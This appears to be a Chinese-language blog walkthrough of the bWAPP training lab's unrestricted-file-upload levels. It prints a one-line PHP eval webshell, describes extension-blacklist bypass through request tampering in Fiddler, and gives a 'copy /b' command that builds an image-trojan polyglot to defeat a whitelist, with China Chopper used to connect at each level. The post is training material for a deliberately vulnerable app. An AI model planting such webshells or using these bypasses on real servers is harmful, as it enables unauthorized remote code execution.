{"title":"bWAPP文件上传漏洞过关细节","date":"2019-08-02T02:48:21.786Z","slug":"file-upload-expolit","comments":true,"updated":"2019-08-02T03:39:51.792Z","content":"<h3 id=\"测试环境及工具\">测试环境及工具<a href=\"post/file-upload-expolit#测试环境及工具\"></a></h3><ul>\n<li>Windows 7 + PHP5.x + MySQL5.6</li>\n<li><a href=\"https://sourceforge.net/projects/bwapp/\" target=\"_blank\" rel=\"noopener\">bWAPP</a></li>\n<li><a href=\"https://www.telerik.com/download/fiddler-everywhere\" target=\"_blank\" rel=\"noopener\">Fiddler</a></li>\n<li><a href=\"https://sourceforge.net/projects/zhongguocaidao/\" target=\"_blank\" rel=\"noopener\">中国菜刀</a></li>\n</ul>\n<h3 id=\"漏洞文件\">漏洞文件<a href=\"post/file-upload-expolit#漏洞文件\"></a></h3><p><code>bWAPP_latest/bWAPP/unrestricted_file_upload.php</code></p>\n<h3 id=\"本次测试脚本\">本次测试脚本<a href=\"post/file-upload-expolit#本次测试脚本\"></a></h3><p><code>poc.php</code><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>($_POST[cmd]); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Unrestricted-File-Upload-Low\">Unrestricted File Upload - Low<a href=\"post/file-upload-expolit#Unrestricted-File-Upload-Low\"></a></h4><p>未进行任何过滤，直接上传PHP脚本后用菜刀连接脚本即可。<br><img src=\"/images/upload-files-poc-low.png\" alt=\"拿到权限\"></p>\n<h4 id=\"Unrestricted-File-Upload-Medium\">Unrestricted File Upload - Medium<a href=\"post/file-upload-expolit#Unrestricted-File-Upload-Medium\"></a></h4><ul>\n<li>开启了黑名单文件后缀校验<br><img src=\"/images/upload-files-poc-medium-blacklist.png\" alt=\"黑名单\"></li>\n<li>利用Fiddler抓包改包<br><img src=\"/images/upload-files-poc-medium-finddler-rules.png\" alt=\"开启Fiddler\"></li>\n<li>用中国菜刀连接<br><img src=\"/images/upload-files-poc-medium.png\" alt=\"拿到权限\"></li>\n</ul>\n<h4 id=\"Unrestricted-File-Upload-High\">Unrestricted File Upload - High<a href=\"post/file-upload-expolit#Unrestricted-File-Upload-High\"></a></h4><ul>\n<li>开启了白名单文件后缀校验<br><img src=\"/images/upload-files-poc-medium-whitelist.png\" alt=\"白名单\"></li>\n<li><p>用cmd制作一句话图片木马</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy /b 任意图片.png+木马.php poc.png</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>上传制作好的poc.png</p>\n</li>\n<li>用中国菜刀连接<br><img src=\"/images/upload-files-poc-high1.png\" alt=\"拿到权限\"><br><img src=\"/images/upload-files-poc-high2.png\" alt=\"拿到权限\"></li>\n</ul>\n","next":{"title":"一步一步搭建Wooyun镜像站并用Nginx映射到外网IP","slug":"build-wooyun-mirror-bugs-drops-step-by-step"},"link":"https://www.alipay.one/post/file-upload-expolit/"}